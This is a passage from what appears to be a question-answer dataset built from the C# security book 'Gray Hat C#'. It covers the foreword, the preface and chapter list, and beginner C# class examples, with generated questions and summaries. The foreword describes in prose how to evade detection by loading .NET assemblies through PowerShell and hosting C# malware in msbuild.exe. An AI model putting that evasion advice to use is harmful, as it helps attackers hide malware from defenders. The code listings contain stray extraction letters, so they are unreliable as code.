a\ndefender’s perspective, this is fantastic. From a pentester, red teamer, or\nadversary’s perspective, this increases the noise of one’s attack significantly.\nFor a book about C#, why do I mention this? Although it has taken me\nyears to realize it, the more PowerShell I write, the more I acknowledge\nthat attackers stand to gain far more agility by developing their tools in\nC# rather than doing so strictly in PowerShell. Allow me to explain:\n• .NET offers a rich reflection API that allows one to load and dynami-\ncally interact with a compiled C# assembly in memory with ease. With\nall the additional introspection performed on PowerShell payloads now,\nthe reflection API enables an attacker to better fly under the radar by\ndeveloping a PowerShell payload that only serves as a .NET assembly\nloader and runner.\n• As Casey Smith (@subTee) has demonstrated, there are many legitimate,\nMicrosoft-signed binaries present on a default installation of Windows\nthat serve as a fantastic host process for C# payloads—msbuild.exe being\namong the stealthiest. Using MSBuild as a host process for C# malware\nembodies the “living off the land” methodology perfectly—the idea\nthat attackers who can blend into a target environment and introduce\na minimal footprint will thrive for a longer period of time.\n• Antimalware vendors to date still remain largely unaware of .NET\nassembly capabilities at runtime. There’s still enough unmanaged code\nmalware out there that the focus hasn’t shifted to effectively hooking\nthe .NET runtime to perform dynamic runtime introspection.\nxiv Foreword\n• With powerful access to the massive .NET class library, those comfort-\nable with PowerShell will find the transition to C# a relatively smooth\none. Conversely, those comfortable with C# will have a lower barrier\nto entry in transferring their skills to other .NET languages such as\nPowerShell and F#.\n• Like PowerShell, C# is a high-level language, which means developers\ndo not have to worry about low-level coding and memory manage-\nment paradigms. Sometimes, however, one needs to go “low level”\n(for example, interacting with the Win32 API). Fortunately, through\nits reflection API and P/Invoke and marshaling interface, C# allows\none to get as low level as needed.\nEveryone has a different motivation for learning C#. My motivation\nwas the need to transition my PowerShell skills in order to become more\nagile with .NET code across more platforms. You, the reader, may have\nbeen drawn to this book as a means to acquire an attacker’s mindset to\nsupplement your existing C# skills. Conversely, you may want to apply your\nexisting attacker’s mindset to a language embraced by many across mul-\ntiple platforms. Whatever your motivation may be, get ready for a wild ride\nthrough Brandon’s head as he imparts his unique experience and wisdom\nin developing offensive and defensive C#.\nMatt Graeber\nMicrosoft MVP\nForeword xv\nPrefaCe\nI get asked a lot why I like C# as much as I do. Being a\nsupporter of open source software, a dedicated Linux\nuser, and a contributor to Metasploit (which is written\npredominantly in Ruby), C# seems like an odd choice\nas my favorite language. When I began writing in C#\nmany years ago, Miguel de Icaza (of GNOME fame)\nhad recently started a small project called Mono. Mono, in essence, is an\nopen source implementation of Microsoft’s .NET framework. C# as a lan-\nguage had been submitted as an ECMA standard, and the .NET framework\nwas touted by Microsoft as a replacement for Java because code could be\ncompiled on one system or platform and run on another. The only issue\nwith this was that Microsoft had only released the .NET framework for the\nWindows operating system. Miguel and a small group of core contributors\ntook it upon themselves to make the Mono project the bridge the .NET\nframework needed to reach the Linux community. Luckily, a friend of mine\nwho had recommended I learn C# but knew I was also very interested in\nLinux, pointed me in the direction of this fledgling project to see whether\nI could use both C# and Linux. After that, I was hooked.",
    "question": "What is the main reason C# is considered a suitable language for developing security tools that need to work across multiple platforms?",
    "summary": "\"Gray Hat C#,\" by Brandon Perry, is a book that teaches how to create and automate security tools using C#. It covers topics like fuzzing, exploiting vulnerabilities, and integrating with various security tools such as Nessus, Nexpose, OpenVAS, Cuckoo Sandbox, sqlmap, and ClamAV. The book also discusses how to decompile and reverse-engineer managed assemblies and how to read offline registry hives. It provides a comprehensive guide for developers looking to build offensive and defensive C# applications. The author, Brandon Perry, emphasizes the advantages of C# for security tool development, including its cross-platform capabilities and strong community support."
  },
  {
    "start": 6,
    "end": 8,
    "text": "C# is a beautiful language. The creator and lead architect of the lan-\nguage, Anders Hejlsberg, got his start working on compilers for Pascal and\nlater Delphi. This experience gave him a keen understanding of truly pow-\nerful features in an assortment of programming languages. After Hejlsberg\njoined Microsoft, C# was born around the year 2000. In its early years, C#\nshared a lot of language features with Java, such as Java’s syntax niceties, but\nover time, it grew into its own language and introduced a slew of features\nbefore Java did, such as LINQ, delegates, and anonymous methods. With\nC#, you have many of the powerful features of C and C++ and can write\nfull-fledged web applications using the ASP.NET stack or rich desktop appli-\ncations. On Windows, WinForms is the UI library of choice, but for Linux,\nthe GTK and QT libraries are easy to use. More recently, Mono has intro-\nduced support for the Cocoa toolkit on OS X platforms. Even iPhones and\nAndroids are supported.\nwhy Should i trust Mono?\nDetractors of the Mono project and the C# language claim that the\ntechnologies are unsafe to use on any platform that isn’t Windows. Their\nbelief that Microsoft will, at the drop of a dime, begin litigating Mono into\noblivion keeps many people from even taking the project seriously. I don’t\nfind this to be a credible risk. As of this writing, not only has Microsoft\nacquired Xamarin—the company Miguel de Icaza created to support the\nMono framework—it has made large swathes of the core .NET framework\nopen source. It has embraced open source software in ways many people\nwould have thought unimaginable under the leadership of Steve Ballmer.\nThe new chief executive officer, Satya Nadella, has demonstrated that\nMicrosoft has no problems at all with open source software, and the com-\npany actively engages the Mono community to enable mobile development\nusing Microsoft technologies.\nwho is this Book For?\nMany people in security-oriented jobs, such as network and application\nsecurity engineers, rely on automation to one extent or another—be it\nfor scanning for vulnerabilities or analyzing malware. With many security\nprofessionals preferring to use a wide variety of operating systems, writing\ntools that everyone can easily run can be difficult. Mono is a great choice\nbecause it is cross-platform and has an excellent core set of libraries that\nmakes automating many aspects of a security professional’s job easy. If\nyou’re interested in learning how to write offensive exploits, automate scan-\nning for infrastructure vulnerabilities, decompile other .NET applications,\nread offline registry hives, or create custom cross-platform payloads, then\nmany of the topics covered in this book will get you started (even if you\ndon’t have a background in C#).\nxviii Preface\nOrganization of this Book\nIn this book, we’ll cover the basics of C# and rapidly implement real-life\nsecurity tools with the rich libraries available to the language. Right out\nof the gate, we’ll write fuzzers to find possible vulnerabilities and write\nfull-blown exploits for any vulnerabilities found. It should become very\napparent how powerful the language features and core libraries are. Once\nthe basics have been covered, we’ll automate popular security tools such\nas Nessus, sqlmap, and Cuckoo Sandbox. Overall, once you’ve finished\nthis book, you’ll have an excellent repertoire of small libraries to automate\nmany of the menial jobs security professionals often perform.\nChapter 1: C# Crash Course In this chapter, you learn the basics of\nC# object-oriented programming with simple examples, but we cover a\nwide variety of C# features. We start with a Hello World program and\nthen build small classes to better understand what object-oriented pro-\ngramming is. We then move on to more advanced C# features, such as\nanonymous methods and P/Invoke.\nChapter 2: Fuzzing and Exploiting XSS and SQL Injection In this\nchapter, we write small HTTP request fuzzers that look for XSS and\nSQL injection in a variety of data types by using the HTTP library to\ncommunicate with web servers.\nChapter 3: Fuzzing SOAP Endpoints In this chapter, we take the con-\ncept of the fuzzers in the previous chapter to the next level by writing\nanother small fuzzer that retrieves and parses a SOAP WSDL to find\npotential SQL injections by automatically generating HTTP requests.\nWe do this while also looking at the excellent XML libraries available in\nthe standard library.\nChapter 4: Writing Connect-Back, Binding, and Metasploit Payloads\nIn this chapter, we break from the focus on HTTP and move on to\ncreat ing payloads. We first create a couple of simple payloads—one over\nTCP and one over UDP. Then you learn how to generate x86/x86_64\nshellcode in Metasploit to create cross-platform and cross-architecture\npayloads.\nChapter 5: Automating Nessus In this chapter, we return to HTTP\nin order to automate the first of several vulnerability scanners, Nessus.\nWe go over how to create, watch, and report on scans of CIDR ranges\nprogrammatically.\nChapter 6: Automating Nexpose In this chapter, we maintain the\nfocus on tool automation by moving on to the Nexpose vulnerability\nscanner. Nexpose, whose API is also HTTP based, can be automated to\nscan for vulnerabilities and create reports. Rapid7, Nexpose’s creator,\noffers a free yearlong license for its community product, which is very\nuseful for home enthusiasts.\nPreface xix\nChapter 7: Automating OpenVAS In this chapter, we conclude the\nfocus on vulnerability scanner automation with OpenVAS, which is open\nsource. OpenVAS has a fundamentally different kind of API than both\nNessus and Nexpose, using only TCP sockets and XML for its commu-\nnication protocol. Because it’s also free, it is useful for hobbyists look-\ning to gain more experience in vulnerability scanning on a budget.\nChapter 8: Automating Cuckoo Sandbox In this chapter, we move\non to digital forensics with the Cuckoo Sandbox. Working with an easy-\nto-use REST JSON API, we automate submitting potential malware\nsamples and then reporting on the results.\nChapter 9: Automating sqlmap In this chapter, we begin exploiting\nSQL injections to their fullest extent by automating sqlmap. We first\ncreate small tools to submit single URLs with the easy-to-use JSON API\nthat is shipped with sqlmap. Once you are familiar with sqlmap, we\nintegrate it into the SOAP WSDL fuzzer from Chapter 3, so any poten-\ntial SQL injection vulnerabilities can automatically be exploited and\nvalidated.\nChapter 10: Automating ClamAV In this chapter, we begin to focus\non interacting with native, unmanaged libraries. ClamAV, a popular\nand open source antivirus project, isn’t written in a .NET language, but\nwe can still interface with its core libraries as well as with its TCP dae-\nmon, which allows for remote use. We cover how to automate ClamAV\nin both scenarios.\nChapter 11: Automating Metasploit In this chapter, we put the focus\nback on Metasploit so that you can learn how to programmatically drive\nit to exploit and report on shelled hosts via the MSGPACK RPC that\nships with the core framework.\nChapter 12: Automating Arachni In this chapter, we focus on auto-\nmating the black-box web application scanner Arachni, a free and open\nsource project, though dual licensed. Using both the simpler REST\nHTTP API and the more powerful MSGPACK RPC that ships with the\nproject, we create small tools to automatically report findings as we\nscan a URL.\nChapter 13: Decompiling and Reversing Managed Assemblies In this\nchapter, we move on to reverse engineering. There are easy-to-use .NET\ndecompilers for Windows, but not for Mac or Linux, so we write a small\none ourselves.\nChapter 14: Reading Offline Registry Hives In this chapter, we move\non to incident response and focus on registry hives by going over the\nbinary structure of the Windows registry. You learn how to parse and\nread offline registry hives, so you can retrieve the boot key of the sys-\ntem, used to encrypt password hashes stored in the registry.\nxx Preface\nacknowledgments\nThis book was 10 years in the making, even if it was only in a word proces-\nsor for three of those years. My family and friends have surely noticed that\nI’ve been constantly talking about C#, but have been more than lenient\nand understanding listeners. Props to the AHA brothers and sisters who\ninspired many of the projects in this book. Many thanks to John Eldridge, a\nfamily friend who introduced me to C# and really jump-started my interest\nin programming. Brian Rogers has been one of the best technical resources\nfor bouncing ideas off of during the development of this book, as well as\nan excellent technical editor with his keen eye and insights. My production\nmanagers Serena Yang and Alison Law made the back and forth of the edit-\ning process about as painless as it could be. Of course, Bill Pollock and Jan\nCash were able to sculpt my muddy words into clear sentences that anyone\ncould read. A huge thanks to the whole No Starch staff!\na Final note\nEach of these chapters only scratches the surface of C#’s power, as well as\nthe potential in the tools we automate and build—especially since many\nof the libraries we create are meant to be flexible and extensible. I hope\nthis book shows you how easy it can be to automate mundane or tedious\ntasks and inspires you to continue building on the tools we started. You’ll\nfind source code and updates to the book at https://www.nostarch.com/\ngrayhatcsharp/.\nPreface xxi",
    "question": "Who is the book \"Gray Hat C#” intended for and what are the main topics it covers?",
    "summary": "C# is a powerful programming language developed by Anders Hejlsberg, known for its features and cross-platform capabilities. Mono, a cross-platform implementation of C#, is reliable and supported by Microsoft, which has embraced open source. This book is for security professionals interested in automating tasks and exploring C# for writing tools and payloads across different platforms. It covers C# basics, fuzzing techniques, vulnerability scanning, and reverse engineering, providing practical skills for security-related work."
  },
  {
    "start": 9,
    "end": 19,
    "text": "1\nC# Cr aSH CourSe\nUnlike other languages, such as Ruby,\nPython, and Perl, C# programs can be run\nby default on all modern Windows machines.\nIn addition, running programs written in C#\non a Linux system such as Ubuntu, Fedora, or another\nflavor couldn’t be easier, especially since Mono can quickly be installed by\nmost Linux package managers like apt or yum. This puts C# in a better posi-\ntion to meet cross-platform needs than most languages, with the benefit of\nan easy and powerful standard library at your fingertips. All in all, C# and the\nMono/.NET libraries make a compelling framework for anyone wanting to\nwrite cross-platform tools quickly and easily.\nChoosing an ide\nMost who want to learn C# will use an integrated development environ-\nment (IDE) like Visual Studio for writing and compiling their code. Visual\nStudio by Microsoft is the de facto standard for C# development around the\nglobe. Free versions such as Visual Studio Community Edition are available\nfor personal use and can be downloaded from Microsoft’s website at https://\nwww.visualstudio.com/downloads/.\nDuring the development of this book, I used MonoDevelop and\nXamarin Studio depending on whether I was on Ubuntu or OS X, respec-\ntively. On Ubuntu, you can easily install MonoDevelop using the apt pack-\nage manager. MonoDevelop is maintained by Xamarin, the company that\nalso maintains Mono. To install it, use the following command:\n$ sudo apt-get install monodevelop\nXamarin Studio is the OS X brand of the MonoDevelop IDE. Xamarin\nStudio and MonoDevelop have the same functionality, but with slightly differ-\nent user interfaces. You can download the installer for the Xamarin Studio\nIDE from the Xamarin website at https://www.xamarin.com/download-it/.\nAny of these three IDEs will fulfill our needs in this book. In fact, if you\njust want to use vim, you don’t even need an IDE! We’ll also soon cover how\nto compile a simple example using the command line C# compiler shipped\nwith Mono instead of an IDE.\na Simple example\nTo anyone who’s used C or Java, the C# syntax will seem very familiar. C# is\na strongly typed language, like C and Java, which means that a variable you\ndeclare in your code can be only one type (an integer, string, or Dog class,\nfor example) and will always be that type, no matter what. Let’s start by\ntaking a quick look at the Hello World example in Listing 1-1, which shows\nsome basic C# types and syntax.\nusing uSystem;\nnamespace vch1_hello_world\n{\nclass wMainClass\n{\npublic static void xMain(string[] yargs)\n{\nz string hello = \"Hello World!\";\n{ DateTime now = DateTime.Now;\n| Console.Write(hello);\n} Console.WriteLine(\" The date is \" + now.ToLongDateString());\n}\n}\n}\nListing 1-1: A basic Hello World application\nRight off the bat, we need to import the namespaces we’ll use, and we\ndo this with a using statement that imports the System namespace u. This\n2 Chapter 1\nenables access to libraries in a program, similar to #include in C, import in\nJava and Python, and require in Ruby and Perl. After declaring the library\nwe want to use, we declare the namespace v our classes will live in.\nUnlike C (and older versions of Perl), C# is an object-oriented lan-\nguage, similar to Ruby, Python, and Java. This means that we can build\ncomplex classes to represent data structures, along with the methods for\nthose data structures, while writing code. Namespaces allow us to organize\nour classes and code as well as to prevent potential name collisions, such\nas when two programmers create two classes with the same name. If two\nclasses with the same name are in different namespaces, there won’t be a\nproblem. Every class is required to have a namespace.\nWith the namespace out of the way, we can declare a class w that will\nhold our Main() method x. As we stated previously, classes allow us to create\ncomplex data types as well as data structures that better fit real-world objects.\nIn this example, the name of the class doesn’t actually matter; it’s just a\ncontainer for our Main() method, which is what really matters because the\nMain() method is what will execute when we run our sample application.\nEvery C# application requires a Main() method, just like in C and Java. If\nyour C# application accepts arguments on the command line, you can use\nthe args variable y to access the arguments passed to the application.\nSimple data structures, such as strings z, exist in C#, and more com-\nplex ones, such as a class representing the date and time {, can also be\ncreated. The DateTime class is a core C# class for dealing with dates. In our\nexample, we use it to store the current date and time (DateTime.Now) in the\nvariable now. Finally, with our variables declared, we can print a friendly\nmessage using the Console class’s Write() | and WriteLine() } methods (the\nlatter of which includes a newline character at the end).\nIf you’re using an IDE, you can compile and run the code by clicking\nthe Run button, which is in the top-left corner of the IDE and looks like a\nPlay button, or by pressing the F5 key. However, if you would like to com-\npile the source code from the command line with the Mono compiler, you\ncan easily do that as well. From the directory with your C# class code, use\nthe mcs tool shipped with Mono to compile your classes into an executable,\nlike so:\n$ mcs Main.cs -out:ch1_hello_world.exe\nRunning the code from Listing 1-1 should print both the string \"Hello\nWorld!\" and the current date on the same line, as in Listing 1-2. On some\nUnix systems, you may need to run mono ch1_hello_world.exe.\n$ ./ch1_hello_world.exe\nHello World! The date is Wednesday, June 28, 2017\nListing 1-2: Running the Hello World application\nCongratulations on your first C# application!\nC# Crash Course 3\nintroducing Classes and interfaces\nClasses and interfaces are used to create complex data structures that would\nbe difficult to represent with just built-in structures. Classes and interfaces\ncan have properties, which are variables that get or set values for a class or\ninterface, and methods, which are like functions that execute on the class\n(or subclasses) or interface and are unique to it. Properties and methods\nare used to represent data about an object. For instance, a Firefighter class\nmight need an int property to represent the firefighter’s pension or a\nmethod that tells the firefighter to drive to a place where there’s a fire.\nClasses can be used as blueprints to create other classes in a technique\ncalled subclassing. When a class subclasses another class, it inherits the prop-\nerties and methods from that class (known as the parent class). Interfaces\nare used as a blueprint for new classes as well, but unlike classes, they don’t\nhave inheritance. Thus a base class that implements an interface won’t pass\ndown the interface’s properties and methods if it’s subclassed.\nCreating a Class\nWe’ll create the simple class shown in Listing 1-3 as an example that rep-\nresents a public servant data structure for someone who works every day to\nmake our lives easier and better.\npublic uabstract class PublicServant\n{\npublic int vPensionAmount { get; set; }\npublic abstract void wDriveToPlaceOfInterest();\n}\nListing 1-3: The PublicServant abstract class\nThe PublicServant class is a special kind of class. It is an abstract class u.\nGenerally, you can just create a class like you do any other type of variable,\nand it is called an instance or an object. Abstract classes, though, cannot be\ninstantiated like other classes; they can only be inherited through subclass-\ning. There are many types of public servants—firefighters and police offi-\ncers are two that come to mind immediately. It would therefore make sense\nto have a base class that these two types of public servants inherit from. In\nthis case, if these two classes were subclasses of PublicServant, they would\ninherit a PensionAmount property v and a DriveToPlaceOfInterest delegate w\nthat must be implemented by subclasses of PublicServant. There is no gen-\neral “public servant” job that someone can apply for, so there isn’t a reason\nto create just a PublicServant instance.\nCreating an Interface\nA complement to classes in C# are interfaces. Interfaces allow a program-\nmer to force a class to implement certain properties or methods that aren’t\ninherited. Let’s create a simple interface to start with, as shown in Listing 1-4.\nThis interface is called IPerson and will declare a couple of properties that\npeople usually have.\n4 Chapter 1\npublic interface uIPerson\n{\nstring vName { get; set; }\nint wAge { get; set; }\n}\nListing 1-4: The IPerson interface\nnote Interfaces in C# are usually prefaced with an I to distinguish them from classes that\nmay implement them. This I isn’t required, but it is a very common pattern used in\nmainstream C# development.\nIf a class were to implement the IPerson interface u, that class would\nneed to implement both a Name v and an Age w property on its own. Otherwise,\nit wouldn’t compile. I’ll show exactly what this means when we implement\nthe Firefighter class next, which implements the IPerson interface. For\nnow, just know that interfaces are an important and useful feature of C#.\nProgrammers familiar with interfaces in Java will feel right at home with\nthem. C programmers can think of them as header files with function dec-\nlarations that expect a .c file to implement the function. Those familiar with\nPerl, Ruby, or Python may find interfaces strange at first because there isn’t\na comparable feature in those languages.\nSubclassing from an Abstract Class and Implementing an Interface\nLet’s put our PublicServant class and IPerson interface to some use and solid-\nify a bit of what we have talked about. We can create a class to represent our\nfirefighters that inherits from the PublicServant class and implements the\nIPerson interface, as shown in Listing 1-5.\npublic class uFirefighter : vPublicServant, wIPerson\n{\npublic xFirefighter(string name, int age)\n{\nthis.Name = name;\nthis.Age = age;\n}\n//implement the IPerson interface\npublic string yName { get; set; }\npublic int zAge { get; set; }\npublic override void {DriveToPlaceOfInterest()\n{\nGetInFiretruck();\nTurnOnSiren();\nFollowDirections();\n}\nprivate void GetInFiretruck() {}\nprivate void TurnOnSiren() {}\nC# Crash Course 5\nprivate void FollowDirections() {}\n}\nListing 1-5: The Firefighter class\nThe Firefighter class u is a bit more complex than anything we’ve\nimplemented yet. First, note that the Firefighter class inherits from the\nPublicServant class v and implements the IPerson interface w. This is done\nby listing the class and interface, separated by commas, after the Firefighter\nclass name and a colon. We then create a new constructor x that is used to\nset the properties of a class when a new class instance is created. The new\nconstructor will accept the name and age of the firefighter as arguments,\nwhich will set the Name y and Age z properties required by the IPerson inter-\nface with the values passed. We then override the DriveToPlaceOfInterest()\nmethod { inherited from the PublicServant class with one of our own,\ncalling a few empty methods that we declare. We’re required to imple-\nment the DriveToPlaceOfInterest() method because it’s marked as abstract\nin the PublicServant class and abstract methods have to be overridden by\nsubclasses.\nnote Classes come with a default constructor that has no parameters to create instances.\nCreating a new constructor actually overrides the default constructor.\nThe PublicServant class and IPerson interface can be very flexible and\ncan be used to create classes with completely different uses. We will imple-\nment one more class, a PoliceOfficer class, as shown in Listing 1-6, using\nPublicServant and IPerson.\npublic class uPoliceOfficer : PublicServant, IPerson\n{\nprivate bool _hasEmergency;\npublic PoliceOfficer(string name, int age)\n{\nthis.Name = name;\nthis.Age = age;\n_hasEmergency = vfalse;\n}\n//implement the IPerson interface\npublic string Name { get; set; }\npublic int Age { get; set; }\npublic bool wHasEmergency\n{\nget { return _hasEmergency; }\nset { _hasEmergency = value; }\n}\npublic override void xDriveToPlaceOfInterest()\n{\nGetInPoliceCar();\n6 Chapter 1\nif (this.yHasEmergency)\nTurnOnSiren();\nFollowDirections();\n}\nprivate void GetInPoliceCar() {}\nprivate void TurnOnSiren() {}\nprivate void FollowDirections() {}\n}\nListing 1-6: The PoliceOfficer class\nThe PoliceOfficer class u is similar to the Firefighter class, but there are\na few differences. Most notably, a new property called HasEmergency w is set in\nthe constructor v. We also override the DriveToPlaceOfInterest() method x as\nin the previous Firefighter class, but this time, we use the HasEmergency prop-\nerty y to determine whether the officer should drive the car with the siren\non. We can use the same combination of parent class and interface to c reate\nclasses that function completely differently.\nTying Everything Together with the Main() Method\nWe can use our new classes to test a few more features of C#. Let’s write a\nnew Main() method to show off these new classes, as shown in Listing 1-7.\nusing System;\nnamespace ch1_the_basics\n{\npublic class MainClass\n{\npublic static void Main(string[] args)\n{\nFirefighter firefighter = new uFirefighter(\"Joe Carrington\", 35);\nfirefighter.vPensionAmount = 5000;\nPrintNameAndAge(firefighter);\nPrintPensionAmount(firefighter);\nfirefighter.DriveToPlaceOfInterest();\nPoliceOfficer officer = new PoliceOfficer(\"Jane Hope\", 32);\nofficer.PensionAmount = 5500;\nofficer.wHasEmergency = true;\nxPrintNameAndAge(officer);\nPrintPensionAmount(officer);\nofficer.yDriveToPlaceOfInterest();\n}\nstatic void PrintNameAndAge(zIPerson person)\nC# Crash Course 7\n{\nConsole.WriteLine(\"Name: \" + person.Name);\nConsole.WriteLine(\"Age: \" + person.Age);\n}\nstatic void PrintPensionAmount({PublicServant servant)\n{\nif (servant is |Firefighter)\nConsole.WriteLine(\"Pension of firefighter: \" + servant.PensionAmount);\nelse if (servant is }PoliceOfficer)\nConsole.WriteLine(\"Pension of officer: \" + servant.PensionAmount);\n}\n}\n}\nListing 1-7: Tying together the PoliceOfficer and Firefighter classes with a Main() method\nTo use the PoliceOfficer and Firefighter classes, we must instantiate\nthem using the constructors we defined in the respective classes. We do this\nfirst with the Firefighter class u, passing a name of Joe Carrington and an age\nof 35 to the class constructor and assigning the new class to the firefighter\nvariable. We also set the firefighter PensionAmount property v to 5000. After the\nfirefighter has been set up, we pass the object to the PrintNameAndAge() and\nPrintPension() methods.\nNote that the PrintNameAndAge() method takes the IPerson interface z as\nan argument, not a Firefighter, PoliceOfficer, or PublicServant class. When\na class implements an interface, you can create methods that accept that\ninterface (in our case, IPerson) as an argument. If you pass IPerson to a\nmethod, the method only has access to the properties or methods that the\ninterface requires instead of to the whole class. In our example, only the\nName and Age properties are available, which is all we need for the method.\nSimilarly, the PrintPensionAmount() method accepts PublicServant { as its\nargument, so it only has access to the PublicServant properties and methods.\nWe can use the C# is keyword to check whether an object is a certain type\nof class, so we do this to check whether our public servant is a Firefighter |\nor a PoliceOfficer }, and we print a message depending on which it is.\nWe do the same for the PoliceOfficer class as we did for Firefighter,\ncreating a new class with a name of Jane Hope and an age of 32; then we set\nher pension to 5500 and her HasEmergency property w to true. After printing\nthe name, age, and pension x, we call the officer’s DriveToPlaceOfInterest()\nmethod y.\nRunning the Main() Method\nRunning the application should demonstrate how classes and methods\ninteract with each other, as shown in Listing 1-8.\n$ ./ch1_the_basics.exe\nName: Joe Carrington\nAge: 35\nPension of firefighter: 5000\n8 Chapter 1\nName: Jane Hope\nAge: 32\nPension of officer: 5500\nListing 1-8: Running the basics program’s Main() method\nAs you can see, the public servants’ names, ages, and pensions are\nprinted to the screen, exactly as expected!\nanonymous Methods\nThe methods we have used so far have been class methods, but we can also\nuse anonymous methods. This powerful feature of C# allows us to dynami-\ncally pass and assign methods using delegates. With a delegate, a delegate\nobject is created that holds a reference to the method that will be called.\nWe c reate this delegate in a parent class and then assign the delegate’s\nreference to anonymous methods in subclasses of the parent class. This\nway, we can dynamically assign a block of code in a subclass to the delegate\ninstead of overriding the parent class’s method. To demonstrate how to use\ndelegates and anonymous methods, we can build on the classes we have\nalready created.\nAssigning a Delegate to a Method\nLet’s update the PublicServant class to use a delegate for the method\nDriveToPlaceOfInterest(), as shown in Listing 1-9.\npublic abstract class PublicServant\n{\npublic int PensionAmount { get; set; }\npublic delegate void uDriveToPlaceOfInterestDelegate();\npublic DriveToPlaceOfInterestDelegate vDriveToPlaceOfInterest { get; set; }\n}\nListing 1-9: The PublicServant class with a delegate\nIn the previous PublicServant class, we needed to override the\nDriveToPlaceOfInterest() method if we wanted to change it. In the new\nPublicServant class, DriveToPlaceOfInterest() is replaced with a delegate u\nand a property v that allow us to call and assign DriveToPlaceOfInterest().\nNow, any classes inheriting from the PublicServant class will have a delegate\nthey can use to set their own anonymous method for DriveToPlaceOfInterest()\ninstead of having to override the method within each class. Because they\ninherit from PublicServant, we’ll need to update our Firefighter and\nPoliceOfficer class constructors accordingly.\nUpdating the Firefighter Class\nWe’ll update the Firefighter class first with the new delegate property. The\nconstructor, shown in Listing 1-10, is the only change we make.\nC# Crash Course 9\npublic uFirefighter(string name, int age)\n{\nthis.vName = name;\nthis.wAge = age;\nthis.DriveToPlaceOfInterest x+= delegate\n{\nConsole.WriteLine(\"Driving the firetruck\");\nGetInFiretruck();\nTurnOnSiren();\nFollowDirections();\n};\n}\nListing 1-10: The Firefighter class using the delegate for the DriveToPlaceOfInterest()\nmethod\nIn the new Firefighter class constructor u, we assign the Name v and\nAge w like we did before. Next, we create the anonymous method and assign\nit to the DriveToPlaceOfInterest delegate property using the += operator x so\nthat calling DriveToPlaceOfInterest() will call the anonymous method. This\nanonymous method prints \"Driving the firetruck\" and then runs the empty\nmethods from the original class. This way, we can add the customized code\nwe want to each method within a class without having to override it.\nCreating Optional Arguments\nThe PoliceOfficer class requires a similar change; we update the constructor\nas shown in Listing 1-11. Because we’re already updating this class, we can\nalso change it to use an optional argument, which is a parameter in a con-\nstructor that does not have to be included when a new instance is created.\nWe’ll create two anonymous methods and use an optional argument to\ndetermine which method to assign to the delegate.\npublic uPoliceOfficer(string name, int age, bool vhasEmergency = false)\n{\nthis.wName = name;\nthis.xAge = age;\nthis.yHasEmergency = hasEmergency;\nif (this.zHasEmergency)\n{\nthis.DriveToPlaceOfInterest += delegate\n{\nConsole.WriteLine(\"Driving the police car with siren\");\nGetInPoliceCar();\nTurnOnSiren();\nFollowDirections();\n};\n} else\n{\nthis.DriveToPlaceOfInterest += delegate\n10 Chapter 1\n{\nConsole.WriteLine(\"Driving the police car\");\nGetInPoliceCar();\nFollowDirections();\n};\n}\n}\nListing 1-11: The new PoliceOfficer constructor\nIn the new PoliceOfficer constructor u, we set the Name w and Age x\nproperties as we did originally. This time, however, we also use an optional\nthird argument v to assign the HasEmergency property y. The third argu-\nment is optional because it does not need to be specified; it has a default\nvalue (false) when the constructor is provided with only the first two argu-\nments. We then set the DriveToPlaceOfInterest delegate property with a new\nanonymous method, depending on whether HasEmergency is true z.\nUpdating the Main() Method\nWith the new constructors, we can run an updated Main() method that is\nalmost identical to the first. It’s detailed in Listing 1-12.\npublic static void Main(string[] args)\n{\nFirefighter firefighter = new Firefighter(\"Joe Carrington\", 35);\nfirefighter.PensionAmount = 5000;\nPrintNameAndAge(firefighter);\nPrintPensionAmount(firefighter);\nfirefighter.DriveToPlaceOfInterest();\nPoliceOfficer officer = new uPoliceOfficer(\"Jane Hope\", 32);\nofficer.PensionAmount = 5500;\nPrintNameAndAge(officer);\nPrintPensionAmount(officer);\nofficer.DriveToPlaceOfInterest();\nofficer = new vPoliceOfficer(\"John Valor\", 32, true);\nPrintNameAndAge(officer);\nofficer.wDriveToPlaceOfInterest();\n}\nListing 1-12: The updated Main() method using our classes with delegates for driving to\nplaces of interest\nThe only differences are in the last three lines, which demonstrate\ncreating a new PoliceOfficer v who has an emergency (the third argument\nto the constructor is true), as opposed to Jane Hope u, who has none. We\nthen call DriveToPlaceOfInterest() on the John Valor officer w.\nC# Crash Course 11\nRunning the Updated Main() Method\nRunning the new method shows how creating two PoliceOfficer classes—\none with an emergency and one without—will print two different things, as\ndemonstrated in Listing 1-13.\n$ ./ch1_the_basics_advanced.exe\nName: Joe Carrington\nAge: 35\nPension of firefighter: 5000\nDriving the firetruck\nName: Jane Hope\nAge: 32\nPension of officer: 5500\nu Driving the police car\nName: John Valor\nAge: 32\nv Driving the police car with siren\nListing 1-13: Running the new Main() method with classes using delegates\nAs you can see, creating a PoliceOfficer class with an emergency causes\nthe officer to drive with the siren on v. Jane Hope, on the other hand, can\ndrive without her siren on u because she has no emergency.\nintegrating with native Libraries\nFinally, sometimes you need to use libraries that are available only in stan-\ndard operating system libraries, such as libc on Linux and user32.dll on\nWindows. If you plan to use code in a library that was written in C, C++, or\nanother language that gets compiled down to native assembly, C# makes\nworking with these native libraries very easy, and we will use this technique\nin Chapter 4 when making cross-platform Metasploit payloads. This feature\nis called Platform Invoke, or P/Invoke for short. Programmers often need\nto use native libraries because they are faster than a virtual machine such\nas used by .NET or Java. Programmers such as financial or scientific profes-\nsionals who use code to do heavy math might write the code that they need\nto be fast in C (for example, code for interfacing directly with hardware)\nbut use C# to handle code that requires less speed.\nListing 1-14 shows a simple application that uses P/Invoke to call the\nstandard C function printf() in Linux or to pop up a message box using\nuser32.dll on Windows.\nclass MainClass\n{\n[uDllImport(\"user32\", CharSet=CharSet.Auto)]\nstatic extern int MessageBox(IntPtr hWnd, String text, String caption, int options);\n[DllImport(\"libc\")]\nstatic extern void printf(string message);\n12 Chapter 1\nstatic void vMain(string[] args)\n{\nOperatingSystem os = Environment.OSVersion;\nif (wos.Platform == xPlatformID.Win32Windows||os.Platform == PlatformID.Win32NT)\n{\nyMessageBox(IntPtr.Zero, \"Hello world!\", \"Hello world!\", 0);\n} else\n{\nzprintf(\"Hello world!\");\n}\n}\n}\nListing 1-14: Demonstrating P/Invoke with a simple example\nThis example looks more complex than it is. We first declare two func-\ntions that will be looked up externally in different libraries. We do this using\nthe DllImport attribute u. Attributes allow you to add extra information to\nmethods (or classes, class properties, and so on) that is used at runtime\nby the .NET or Mono virtual machine. In our case, the DllImport attribute\ntells the runtime to look up the method we are declaring in another DLL,\ninstead of expecting us to write it.\nWe also declare the exact function names and the parameters the func-\ntions expect. For Windows, we can use the 